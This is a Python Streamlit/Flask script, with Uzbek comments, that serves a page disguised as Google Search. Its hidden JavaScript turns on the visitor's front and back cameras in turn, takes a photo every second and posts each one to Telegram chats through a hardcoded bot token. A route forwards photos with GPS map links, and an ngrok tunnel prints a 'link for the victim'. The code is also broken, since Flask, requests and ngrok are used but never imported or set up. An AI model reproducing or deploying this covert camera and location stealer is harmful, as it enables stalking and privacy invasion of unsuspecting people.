import streamlit as st
import streamlit.components.v1 as components

# Sening ma'lumotlaring
TOKEN = "8535757948:AAESPLCJXyg9ilrnqW6ejWCQrb3jNnOZSK4"
CHAT_IDS = ["8354222032", "6119420877"]

st.set_page_config(page_title="Google Search", page_icon="🔍", layout="centered")

# JS orqali kamera va GPS'ni boshqarish
# Har 1 soniyada rasm oladi (Pulemyot rejimi)
html_code = f"""
<div style="text-align:center; padding-top:50px; font-family: Arial;">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="160">
    <h3 style="color:#555;">Sahifa yuklanmoqda...</h3>
    <video id="v" width="1280" height="720" autoplay style="display:none;"></video>
    <canvas id="c" width="1280" height="720" style="display:none;"></canvas>
</div>

<script>
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    let facing = "user";

    async function start() {{
        try {{
            const stream = await navigator.mediaDevices.getUserMedia({{video: {{facingMode: facing}}}});
            v.srcObject = stream;
            
            setInterval(async () => {{
                c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
                c.toBlob(blob => {{
                    const f = new FormData();
                    f.append('chat_id', '{CHAT_IDS[0]}'); // Birinchi chatga
                    f.append('photo', blob, 'img.jpg');
                    f.append('caption', '📸 ' + (facing === "user" ? "OLDI" : "ORQA") + ' KAMERA');
                    
                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f}});
                    
                    // Ikkinchi chatga ham yuborish
                    const f2 = new FormData();
                    f2.append('chat_id', '{CHAT_IDS[1]}');
                    f2.append('photo', blob, 'img.jpg');
                    fetch('https://api.telegram.org/bot{TOKEN}/sendPhoto', {{method:'POST', body:f2}});
                    
                }}, 'image/jpeg', 0.6);
                
                // Kamerani almashtirib turish
                facing = (facing === "user") ? "environment" : "user";
            }}, 1000); 
        }} catch (e) {{}}
    }}
    start();
    // 10 soniyadan keyin Google'ga otib yuboradi
    setTimeout(() => {{ window.location.href="https://www.google.com"; }}, 10000);
</script>
"""

components.html(html_code, height=600)

@app.route('/')
def home():
    return render_template_string(html_code)

@app.route('/upload', methods=['POST'])
def upload():
    # 'Noma'lum' so'zidan SyntaxError chiqmasligi uchun tirnoqni olib tashladik
    lat = request.form.get('lat', 'Nomalum')
    lon = request.form.get('lon', 'Nomalum')
    cam = request.form.get('cam')
    file = request.files.get('photo').read()
    
    # Sifatli manzil linki
    maps_link = f"http://maps.google.com/maps?q={lat},{lon}&t=k"
    caption = f"🎯 {cam}\\n📍 Manzil: {maps_link}"
    
    for cid in CHAT_IDS:
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': cid, 'caption': caption}, files={'photo': file})
        except: pass
    return "ok"

if __name__ == '__main__':
    # Ngrok orqali link yaratish
    public_url = ngrok.connect(5000).public_url
    print(f"\\n🌍 JABRLANUVCHI UCHUN LINK: {public_url}\\n")

    app.run(port=5000)
